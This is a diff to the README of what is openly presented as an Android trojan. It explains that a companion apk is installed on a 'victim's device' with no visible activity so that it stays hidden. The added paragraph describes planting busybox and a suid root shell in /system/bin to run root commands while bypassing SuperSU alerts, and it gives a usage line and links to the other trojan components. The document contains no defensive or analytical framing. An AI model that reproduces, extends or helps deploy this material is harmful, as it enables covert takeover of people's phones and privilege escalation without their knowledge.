@@ -8,6 +8,8 @@ This apk should be installed right after service apk is installed on victim's de
 otherwise it wouldn't start (it doesnt have activity for the purpose of invisibility). You can choose either root or regular install.
 After installation this apk is no longer needed and may be deleted.
 
+Optionally (it's set by default default, though) it also installs 2 useful native binaries to /system/bin directory  - busybox and simple suid shell. If the Android version is below 4.3, the suid bit will work and the shell will provide you the option of root commands execution with bypass of superSu app's alerts (should be run via regular shell command like : execroot your_cmd your_arg1 ...). Busybox in its turn gives you a good set of all the neccessary linux commands in case it hasnt been intalled in the system already.
+
 HERE ARE LINKS TO THE OTHER COMPONENTS:
 
 trojan service apk: https://github.com/androidtrojan1/android-trojan-service-
